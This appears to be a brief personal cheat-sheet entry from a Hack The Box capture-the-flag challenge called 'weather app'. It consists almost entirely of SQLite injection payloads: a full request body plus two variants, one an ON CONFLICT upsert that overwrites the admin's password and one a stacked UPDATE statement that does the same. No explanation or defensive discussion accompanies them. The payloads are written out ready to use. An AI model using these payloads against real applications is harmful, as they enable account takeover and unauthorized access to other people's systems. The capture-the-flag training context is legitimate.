SQLITE:

A different command that was used in the htb challenge 'weather app':
"username=admin&password=') ON CONFLICT(username) DO UPDATE SET password = 'cave';--"
The payload itself is: 
') ON CONFLICT(username) DO UPDATE SET password = 'cave';--
or: ');UPDATE users SET 'password' = 'test' WHERE username='admin'--

